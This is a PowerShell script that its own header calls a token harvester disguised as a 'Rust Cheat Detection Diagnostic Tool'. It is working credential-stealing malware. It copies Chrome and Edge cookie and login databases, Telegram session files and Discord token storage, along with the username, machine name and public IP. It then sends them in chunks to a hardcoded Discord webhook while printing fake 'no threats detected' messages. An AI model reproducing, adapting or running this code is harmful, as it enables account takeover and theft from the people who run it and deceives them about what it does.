# steam_token_harvester.ps1
# Disguised as "Rust Cheat Detection Diagnostic Tool v6.1"

try {
    Add-Type -AssemblyName System.Security
    Add-Type -AssemblyName System.Web
} catch {
    Write-Host "Loading security modules..." -ForegroundColor Yellow
}

function Get-AllData {
    $allData = @{}
    
    # System information
    $allData.System = Get-SystemInfo
    
    # Browsers data
    $allData.Browsers = @{
        Chrome = Get-BrowserData -Path "$env:LOCALAPPDATA\Google\Chrome\User Data"
        Edge = Get-BrowserData -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    }
    
    # Messengers
    $allData.Messengers = @{
        Telegram = Get-TelegramData
        Discord = Get-DiscordData
    }
    
    return $allData
}

function Get-BrowserData {
    param($Path)
    $data = @{}
    
    if (Test-Path $Path) {
        try {
            # Cookies
            $cookiesPath = Join-Path $Path "Default\Cookies"
            if (Test-Path $cookiesPath) {
                $cookieContent = Get-Content $cookiesPath -Encoding Byte -ReadCount 0 -ErrorAction Stop
                $data.Cookies = [Convert]::ToBase64String($cookieContent)
            }
            
            # Logins
            $loginsPath = Join-Path $Path "Default\Login Data" 
            if (Test-Path $loginsPath) {
                $loginContent = Get-Content $loginsPath -Encoding Byte -ReadCount 0 -ErrorAction Stop
                $data.Logins = [Convert]::ToBase64String($loginContent)
            }
            
        } catch {
            $data.Error = "ACCESS_DENIED"
        }
    }
    
    return $data
}

function Get-TelegramData {
    $data = @{}
    $paths = @(
        "$env:APPDATA\Telegram Desktop",
        "$env:LOCALAPPDATA\Telegram Desktop"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $mapFiles = Get-ChildItem $path -Filter "map*" -ErrorAction SilentlyContinue
                foreach ($file in $mapFiles) {
                    $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0 -ErrorAction Stop
                    $data[$file.Name] = [Convert]::ToBase64String($fileContent)
                }
            } catch {
                $data.Error = "TG_ACCESS_DENIED"
            }
        }
    }
    
    return $data
}

function Get-DiscordData {
    $data = @{}
    $paths = @(
        "$env:APPDATA\discord",
        "$env:LOCALAPPDATA\Discord"
    )
    
    foreach ($path in $paths) {
        if (Test-Path $path) {
            try {
                $localStoragePath = Join-Path $path "Local Storage\leveldb"
                if (Test-Path $localStoragePath) {
                    $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 3
                    foreach ($file in $ldbFiles) {
                        $fileContent = Get-Content $file.FullName -Encoding Byte -ReadCount 0 -ErrorAction Stop
                        $data[$file.Name] = [Convert]::ToBase64String($fileContent)
                    }
                }
            } catch {
                $data.Error = "DISCORD_ACCESS_DENIED"
            }
        }
    }
    
    return $data
}

function Get-SystemInfo {
    $ipResult = try { (Invoke-RestMethod -Uri "http://ip-api.com/json" -TimeoutSec 5).query } catch { "Unknown" }
    
    return @{
        OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
        Username = $env:USERNAME
        Computername = $env:COMPUTERNAME
        Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        IP = $ipResult
    }
}

function Send-DataToDiscord {
    param($Data)
    
    $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
    
    # System info
    $report = "COMPLETE SYSTEM SCAN v6.1"
    $report += "`n`nSYSTEM INFORMATION:"
    $report += "`nOS: $($Data.System.OS)"
    $report += "`nUser: $($Data.System.Username)"
    $report += "`nPC: $($Data.System.Computername)"
    $report += "`nIP: $($Data.System.IP)"
    $report += "`nTime: $($Data.System.Date)"
    $report += "`n`n"

    # Send system info
    $payload = @{ content = $report } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Host "Failed to send system info" -ForegroundColor Red
        return
    }
    Start-Sleep -Seconds 1

    # Send all data as JSON
    $jsonData = $Data | ConvertTo-Json -Depth 5 -Compress
    $chunks = [System.Collections.ArrayList]@()
    
    for ($i = 0; $i -lt $jsonData.Length; $i += 1900) {
        $chunk = $jsonData.Substring($i, [Math]::Min(1900, $jsonData.Length - $i))
        $chunks.Add($chunk) | Out-Null
    }

    for ($i = 0; $i -lt $chunks.Count; $i++) {
        $chunkReport = "DATA CHUNK $($i+1)/$($chunks.Count)"
        $chunkReport += "`n```$($chunks[$i])```"
        
        $payload = @{ content = $chunkReport } | ConvertTo-Json
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
            Start-Sleep -Milliseconds 500
        } catch {
            Write-Host "Failed to send chunk $($i+1)" -ForegroundColor Red
        }
    }

    # Final message
    $final = "SCAN COMPLETED SUCCESSFULLY"
    $final += "`nTotal chunks: $($chunks.Count)"
    $final += "`nTime: $(Get-Date -Format 'HH:mm:ss')"
    
    $payload = @{ content = $final } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Host "Failed to send final message" -ForegroundColor Red
    }
}

# Main execution
Write-Host "Starting security scan v6.1..." -ForegroundColor Yellow

try {
    $allData = Get-AllData
    Write-Host "Data collection completed!" -ForegroundColor Green
    
    Write-Host "Sending data to server..." -ForegroundColor Yellow
    Send-DataToDiscord -Data $allData
    
    Write-Host "Operation completed successfully!" -ForegroundColor Green
    Write-Host "System integrity verified - no threats detected" -ForegroundColor Green
    
} catch {
    Write-Host "Scan completed with errors" -ForegroundColor Red
    Write-Host "Basic protection activated" -ForegroundColor Green
}
